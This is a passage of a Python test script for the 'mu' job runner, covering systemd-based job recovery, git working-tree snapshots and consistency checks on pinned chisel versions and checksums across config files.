                      MU_WSL_HOST_DRIVE="/nonexistent", MU_HOME=os.path.join(base, "home"))
    from mu import node

    def prep(j):
        shutil.rmtree(os.path.join(j["dir"], "work"), ignore_errors=True)
        os.mkdir(os.path.join(j["dir"], "work"))
    node.prepare_work = prep
    st = {}

    def fresh(tag, **nodejson):
        d = os.path.join(base, tag)
        for x in ("srv/jobs", "stub", "home"):
            os.makedirs(os.path.join(d, x))
        node.ROOT = os.path.join(d, "srv")
        os.environ["STUB_DIR"] = st["stub"] = os.path.join(d, "stub")
        durable.write_record(os.path.join(node.ROOT, "node.json"), dict({"name": "n", "min_free_gb": 0}, **nodejson))

    def mkjob(jid, ns):
        d = node.job_dir(jid)
        os.makedirs(d)
        durable.write_record(os.path.join(d, "job.json"), {"schema": 1, "job_id": jid, "project_id": "p-0123456789ab",
                                                           "mu_version": "v1", "argv": ["true"], "cwd": "", "outputs": [],
                                                           "limits": {}, "rerun": True, "accepted_ns": ns})
        durable.write_record(os.path.join(d, "state.json"), {"state": "queued", "attempt": 1})
        return d

    def stub(name, text=""):
        with open(os.path.join(st["stub"], name), "w") as f:
            f.write(text)

    def unit_line(jid, active, result):
        with open(os.path.join(st["stub"], "units"), "a") as f:
            f.write("mu-job-%s.service %s %s\n" % (jid, active, result))

    def job(jid):
        return node.load_job(jid)

    def started():
        try:
            return [ln.split()[1] for ln in open(os.path.join(st["stub"], "calls")) if ln.startswith("start ")]
        except OSError:
            return []
    A, B = "20261114-100000-aaaaaa", "20261114-100001-bbbbbb"
    ua, ub = "mu-job-%s.service" % A, "mu-job-%s.service" % B

    def flag(f):
        return " (fault %s is on: this must FAIL)" % f if durable.fault(f) else ""

    # 1. one failed `systemctl show` (a bus error) does not end a running job
    fresh("bus")
    da = mkjob(A, 1)
    node.step(first=True)
    with open(os.path.join(da, "work", "partial.dat"), "w") as f:
        f.write("in progress")
    stub("show-fail")
    node.step()
    os.unlink(os.path.join(st["stub"], "show-fail"))
    node.step()
    j = job(A)
    check("a failed systemctl show leaves the job running, its work/ and attempt 1 (no re-run, no result)" +
          flag("bus-error-is-end"), j["result"] is None and (j["state"] or {}).get("state") == "running" and
          j["state"].get("attempt") == 1 and os.path.exists(os.path.join(da, "work", "partial.dat")),
          (j["state"], j["result"] and j["result"].get("note")))

    # 2. systemd-run fails but the unit exists: not failed, nothing started beside it
    fresh("runfail")
    mkjob(A, 1)
    mkjob(B, 2)
    stub("run-rc", "1")
    node.step(first=True)
    stub("run-rc", "0")
    node.step()
    ja, jb = job(A), job(B)
    check("systemd-run failed after making the unit: the job stays running, the next is not started" + flag("trust-run-rc"),
          ja["result"] is None and (ja["state"] or {}).get("state") == "running" and started() == [ua], (
              ja["result"] and ja["result"].get("note"), started()))
    # ... and a start that really failed (no unit) goes back to the queue, failed after 3
    fresh("nocreate")
    mkjob(A, 1)
    stub("run-rc", "1")
    stub("run-nocreate")
    node.step(first=True)
    j1 = job(A)
    node.step()
    node.step()
    j3 = job(A)
    check("a start without a unit: queued again with the attempt kept, failed after 3 tries",
          (j1["state"] or {}).get("state") == "queued" and j1["state"].get("start_failures") == 1 and
          j1["state"].get("attempt") == 1 and (j3["result"] or {}).get("state") == "failed", (j1["state"], j3["result"]))

    # 3. state.json unreadable while the job runs: rebuilt, not started again
    fresh("torn")
    da = mkjob(A, 1)
    node.step(first=True)
    with open(os.path.join(da, "work", "partial.dat"), "w") as f:
        f.write("in progress")
    with open(os.path.join(da, "state.json"), "wb") as f:
        f.write(b"\0" * 300)
    node.step()
    j = job(A)
    check("state.json NUL-filled while running: rebuilt as running, not started twice, work/ kept" + flag("no-unit-check-torn"),
          j["result"] is None and (j["state"] or {}).get("state") == "running" and started() == [ua] and
          os.path.exists(os.path.join(da, "work", "partial.dat")), (j["state"], started()))

    # 4. a re-run keeps the log: offsets stay valid, the marker says what happened
    fresh("rerun")
    da = mkjob(A, 1)
    node.step(first=True)
    with open(os.path.join(da, "log"), "wb") as f:
        f.write(b"A" * 100)
    stub("units", "")              # the unit is gone (the distro stopped): the job ended without a result
    node.step()
    try:
        with open(os.path.join(da, "log"), "rb") as f:
            log = f.read()
    except OSError:
        log = b""
    j = job(A)
    check("a re-run keeps the first attempt's log and appends a marker (a reader at byte 100 misses nothing)" +
          flag("log-truncate-on-rerun"), log.startswith(b"A" * 100) and b"re-run as attempt 2" in log and
          (j["state"] or {}).get("attempt") == 2, (log[:120], j["state"]))

    # 5. one job's error does not stop the pass: another job's cancel is still done
    fresh("ioerr")
    da = mkjob(A, 1)
    db = mkjob(B, 2)
    node.step(first=True)
    unit_line(A, "failed", "exit-code")
    durable.write_durable(os.path.join(db, "cancel"), "cancel\n")
    os.chmod(da, 0o500)
    raised = None
    try:
        node.step()
    except Exception as e:  # noqa
        raised = repr(e)
    os.chmod(da, 0o700)
    jb = job(B)
    check("a job whose folder cannot be written does not stop the pass: the other job's cancel is done" +
          flag("runner-pass-aborts"), raised is None and (jb["result"] or {}).get("state") == "cancelled", (raised, jb["result"]))
    if os.getuid() == 0:
        print("info  (as root the folder stays writable: the scenario checks less)")

    # 6. too little disk: the job waits instead of starting
    fresh("disk", min_free_gb=10 ** 9)
    mkjob(A, 1)
    node.step(first=True)
    j = job(A)
    check("free disk below min_free_gb: the next job waits (queued, a note), not started" + flag("no-start-disk-check"),
          started() == [] and (j["state"] or {}).get("state") == "queued" and "waiting" in (j["state"].get("note") or ""),
          (started(), j["state"]))

    # 7. a log past its cap stops the job, which ends failed with that note
    fresh("logcap", log_cap_gb=1e-6)
    da = mkjob(A, 1)
    node.step(first=True)
    with open(os.path.join(da, "log"), "wb") as f:
        f.write(b"x" * 5000)
    node.step()
    try:
        stopped = any(ln.startswith("--user stop %s" % ua) or ln.startswith("stop %s" % ua)
                      for ln in open(os.path.join(st["stub"], "calls")))
    except OSError:
        stopped = False
    unit_line(A, "inactive", "success")
    node.step()
    j = job(A)
    check("a log over its cap: the unit is stopped and the job ends failed, saying so" + flag("no-log-cap"),
          stopped and (j["result"] or {}).get("state") == "failed" and "log grew past" in (j["result"].get("note") or ""),
          (stopped, j["result"] and j["result"].get("note")))

    # 8. a final-named folder with an unreadable job.json is moved aside, never deleted
    fresh("damaged")
    d = node.job_dir(A)
    os.makedirs(d)
    with open(os.path.join(d, "job.json"), "wb") as f:
        f.write(b"\0" * 100)
    durable.write_record(os.path.join(d, "result.json"), {"job_id": A, "state": "succeeded"})
    node.recover()
    kept = [x for x in os.listdir(os.path.join(node.ROOT, "damaged"))] if os.path.isdir(os.path.join(node.ROOT, "damaged")) else []
    check("recovery moves a damaged job folder to damaged/ with its result, never deletes it" + flag("delete-damaged"),
          len(kept) == 1 and os.path.exists(os.path.join(node.ROOT, "damaged", kept[0], "result.json")), kept)

    # 9. results are written once
    fresh("once")
    mkjob(A, 1)
    j = job(A)
    node.write_result(j, "succeeded", "shim")
    j = job(A)
    node.write_result(j, "failed", "runner", note="late")
    check("a valid result.json is never replaced" + flag("overwrite-result"), job(A)["result"]["state"] == "succeeded",
          job(A)["result"]["state"])

    # 10. the queue's order survives a clock that steps back
    fresh("clock")
    real = time.time_ns
    try:
        time.time_ns = lambda: 2000
        a1 = node.next_accept_ns()
        time.time_ns = lambda: 1000
        a2 = node.next_accept_ns()
    finally:
        time.time_ns = real
    check("accepted_ns increases when the clock steps back (FIFO kept)", a2 > a1, (a1, a2))
    shutil.rmtree(base, ignore_errors=True)


# ------------------------------------------------------------------------------------------------ the snapshot
def git(cwd, *args, **kw):
    r = subprocess.run(["git"] + list(args), cwd=cwd, capture_output=True, text=True, **kw)
    if r.returncode != 0:
        raise RuntimeError("git %s: %s" % (" ".join(args), r.stderr))
    return r.stdout.strip()


def make_project(lfs=False):
    d = tmpdir("project")
    root = os.path.join(d, "Frame Project")
    os.mkdir(root)
    git(root, "init", "-q", "-b", "main")
    git(root, "config", "user.name", "Test")
    git(root, "config", "user.email", "t@example.invalid")
    files = {"mu.toml": '[mu]\nversion = "v2026.11.6"\n[compute]\noutputs = ["results/*.json"]\n',
             "fea.py": "print('hi')\n", "staged.txt": "s0\n", "unstaged.txt": "u0\n", "gone.txt": "bye\n",
             "run.sh": "#!/bin/sh\necho run\n", ".gitignore": "*.tmp\nbuild/\n", "sub/deep.txt": "deep\n"}
    for k, v in files.items():
        os.makedirs(os.path.dirname(os.path.join(root, k)) or root, exist_ok=True)
        with open(os.path.join(root, k), "w") as f:
            f.write(v)
    git(root, "add", "-A")
    git(root, "commit", "-qm", "first")
    with open(os.path.join(root, "staged.txt"), "w") as f:
        f.write("s1\n")
    git(root, "add", "staged.txt")
    with open(os.path.join(root, "unstaged.txt"), "w") as f:
        f.write("u1\n")
    os.unlink(os.path.join(root, "gone.txt"))
    os.chmod(os.path.join(root, "run.sh"), 0o755)
    with open(os.path.join(root, "new.txt"), "w") as f:
        f.write("untracked\n")
    with open(os.path.join(root, "junk.tmp"), "w") as f:
        f.write("ignored\n")
    os.symlink("fea.py", os.path.join(root, "link.py"))
    os.makedirs(os.path.join(root, ".mu", "jobs"))
    with open(os.path.join(root, ".mu", "jobs", "x.json"), "w") as f:
        f.write("{}")
    with open(os.path.join(root, "stashme.txt"), "w") as f:
        f.write("1\n")
    git(root, "add", "stashme.txt")
    git(root, "stash", "push", "-q", "-m", "user stash", "--", "stashme.txt")
    return d, root


def repo_state(root):
    gitdir = git(root, "rev-parse", "--absolute-git-dir")
    files = {}
    for dp, dn, fs in os.walk(root):
        if ".git" in dn:
            dn.remove(".git")
        for f in fs + [x for x in dn if os.path.islink(os.path.join(dp, x))]:
            p = os.path.join(dp, f)
            st = os.lstat(p)
            files[os.path.relpath(p, root)] = (st.st_mtime_ns, st.st_size, st.st_mode)
    with open(os.path.join(gitdir, "index"), "rb") as f:
        index = hashlib.sha256(f.read()).hexdigest()
    return {"HEAD": git(root, "rev-parse", "HEAD"), "branch": git(root, "symbolic-ref", "-q", "HEAD"), "index": index,
            "stash": git(root, "stash", "list"), "status": git(root, "status", "--porcelain=v1"), "files": files}


def t_snapshot_alone():
    d, root = make_project()
    before = repo_state(root)
    time.sleep(0.05)
    jid = proto.new_job_id()
    s = jobs.snapshot(root, jid)
    after = repo_state(root)
    diff = [k for k in before if before[k] != after[k]]
    check("the snapshot leaves index, HEAD, branch, stash, status and every file's mtime/size/mode alone" +
          (" (fault user-index is on: this must FAIL)" if durable.fault("user-index") else ""), not diff,
          "changed: %s" % diff)
    s2 = jobs.snapshot(root, jid)
    check("the same job id gives the same commit (fixed identity and dates)", s2["snapshot"] == s["snapshot"], (s, s2))
    git(root, "config", "--unset", "user.name")
    git(root, "config", "--unset", "user.email")
    env_ok = True
    try:
        jobs.snapshot(root, proto.new_job_id())
    except proto.MuError:
        env_ok = False
    check("a snapshot works without user.name", env_ok)
    check("refs/mu/snap/<id> points at it", git(root, "rev-parse", "refs/mu/snap/" + jid) == s["snapshot"])
    gitdir = git(root, "rev-parse", "--absolute-git-dir")
    check("no temporary index is left in .git", not [f for f in os.listdir(gitdir) if f.startswith("mu-index")])
    shutil.rmtree(d)


def t_snapshot_content():
    d, root = make_project()
    s = jobs.snapshot(root, proto.new_job_id())
    names = set(git(root, "ls-tree", "-r", "--name-only", s["snapshot"]).split("\n"))
    show = lambda p: git(root, "show", "%s:%s" % (s["snapshot"], p))  # noqa
    tree = {ln.split("\t")[1]: ln.split()[0] for ln in git(root, "ls-tree", "-r", s["snapshot"]).split("\n")}
    checks = {
        "staged change": show("staged.txt") == "s1",
        "unstaged change": show("unstaged.txt") == "u1",
        "untracked file": "new.txt" in names,
        "deletion": "gone.txt" not in names,
        "mode change": tree.get("run.sh") == "100755",
        "symlink as a link": tree.get("link.py") == "120000",
        "ignored file left out": "junk.tmp" not in names,
        ".mu/ left out": not any(n.startswith(".mu/") for n in names),
        "the stash's file left out": "stashme.txt" not in names,
        "dirty is true": s["dirty"] is True,
        "parent is HEAD": git(root, "rev-parse", s["snapshot"] + "^") == git(root, "rev-parse", "HEAD"),
    }
    bad = [k for k, v in checks.items() if not v]
    check("snapshot content: staged, unstaged, untracked, deleted, mode and symlink in; ignored and .mu/ out" +
          (" (fault no-mu-exclude is on: this must FAIL)" if durable.fault("no-mu-exclude") else ""), not bad, "wrong: %s" % bad)
    shutil.rmtree(d)


def t_snapshot_report():
    d, root = make_project()
    sub = os.path.join(d, "subrepo")
    os.mkdir(sub)
    git(sub, "init", "-q")
    git(sub, "-c", "user.name=t", "-c", "user.email=t@x", "commit", "-q", "--allow-empty", "-m", "s")
    emb = os.path.join(root, "embedded")
    git(d, "clone", "-q", sub, emb)   # (not a copy: git's background maintenance may be writing in it)
    lfs = subprocess.run(["git", "lfs", "version"], capture_output=True).returncode == 0
    if lfs:
        git(root, "lfs", "install", "--local")
        git(root, "lfs", "track", "*.bin")
        with open(os.path.join(root, "big.bin"), "wb") as f:
            f.write(os.urandom(5000))
    s = jobs.snapshot(root, proto.new_job_id())
    check("an embedded repository is reported as a gitlink", s["gitlinks"] == ["embedded"], s["gitlinks"])
    if lfs:
        check("an LFS file is reported as a pointer", s["lfs"] == ["big.bin"], s["lfs"])
    else:
        print("skip  LFS pointer report (no working git-lfs here)")
    shutil.rmtree(d)


# ------------------------------------------------------------------------------------------------ the chisel pins
def t_pins(repo):
    import re
    apps = open(os.path.join(repo, "toolchain", "apps.toml")).read()
    sec = apps[apps.index("[chisel]"):]
    sec = sec[:sec.index("\n[", sec.index("[chisel.linux-64]") + 5)] if "\n[" in sec[sec.index("[chisel.linux-64]") + 5:] else sec
    version = re.search(r'^version\s*=\s*"([^"]+)"', sec, re.M).group(1)
    lin = re.search(r'\[chisel\.linux-64\][^\[]*?sha256\s*=\s*"([0-9a-f]{64})"', sec, re.S).group(1)
    mac = re.search(r'\[chisel\.osx-arm64\][^\[]*?sha256\s*=\s*"([0-9a-f]{64})"', sec, re.S).group(1)
    urls = re.findall(r'url\s*=\s*"([^"]+)"', sec)
    dock = open(os.path.join(repo, "relay", "Dockerfile")).read()
    dv = re.search(r"CHISEL_VERSION=([0-9.]+)", dock).group(1)
    dsum = re.search(r"CHISEL_SHA256_AMD64=([0-9a-f]{64})", dock).group(1)
    check("apps.toml and relay/Dockerfile name the same chisel version (%s, %s)" % (version, dv), version == dv)
    check("apps.toml's linux-64 sum is relay/Dockerfile's amd64 sum", lin == dsum, (lin, dsum))
    check("every chisel URL in apps.toml names v%s" % version, urls and all(("/v%s/" % version) in u and ("_%s_" % version) in u
                                                                              for u in urls), urls)
    check("the osx-arm64 sum is a sum", bool(re.match(r"^[0-9a-f]{64}$", mac)))
    distro = open(os.path.join(repo, "install", "hosts", "wsl2", "mu-wsl2-distro.sh")).read()
    dvv = re.findall(r"^CHISEL_VERSION=\"?([0-9.]+)", distro, re.M)
    dgz = re.findall(r"^CHISEL_GZ_SHA256=\"?([0-9a-f]{64})", distro, re.M)
    durl = re.findall(r"^CHISEL_URL=\"?([^\"\s]+)", distro, re.M)
    check("mu-wsl2-distro.sh pins chisel %s, the linux-64 archive's sum and URL of apps.toml" % version,
          dvv == [version] and dgz == [lin] and len(durl) == 1 and durl[0] in urls, (dvv, dgz, durl))


SECTIONS = {"durable": t_durable_main, "atomic": t_atomic, "ids": t_ids, "globs": t_globs, "proxy": t_proxy,
            "classify": t_classify, "sshconfig": t_sshconfig, "controlpath": t_controlpath, "unpack": t_unpack,
            "untrusted-node": t_untrusted_node, "runner": t_runner,
            "snapshot-alone": t_snapshot_alone, "snapshot-content": t_snapshot_content,
            "snapshot-report": t_snapshot_report}

if __name__ == "__main__":
    sec = sys.argv[1]
    if sec == "pins":
        t_pins(sys.argv[2] if len(sys.argv) > 2 else REPO)
    elif sec == "atomic" and len(sys.argv) > 2:
        t_atomic(int(sys.argv[2]))
    else:
        SECTIONS[sec]()
    sys.exit(min(FAILS[0], 100))
